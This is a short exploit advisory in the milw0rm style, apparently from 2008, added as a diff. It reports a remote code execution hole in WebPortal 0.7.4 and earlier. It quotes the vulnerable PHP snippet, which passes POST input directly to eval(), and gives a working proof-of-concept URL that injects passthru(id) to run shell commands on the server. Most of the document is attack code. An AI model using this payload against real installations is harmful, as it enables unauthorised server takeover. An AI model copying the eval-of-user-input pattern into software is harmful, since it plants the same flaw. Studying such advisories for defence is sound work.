@@ -1,0 +1,15 @@
+WebPortal <= 0.7.4 (code) Remote Code Execution Vulnerability
+Download : http://webportal.ivanoculmine.com/download.php?mid=14
+Vuln :
+######################################################################
+        <?
+        if ($_GET["action"] == "execute") {
+          eval (stripslashes($_POST["code"]));
+        }
+        ?>
+######################################################################
+POC :
+/index.php?m=admin&f=console&action=execute&code=(id);} passthru(id);
+######################################################################
+
+# milw0rm.com [2008-09-23]
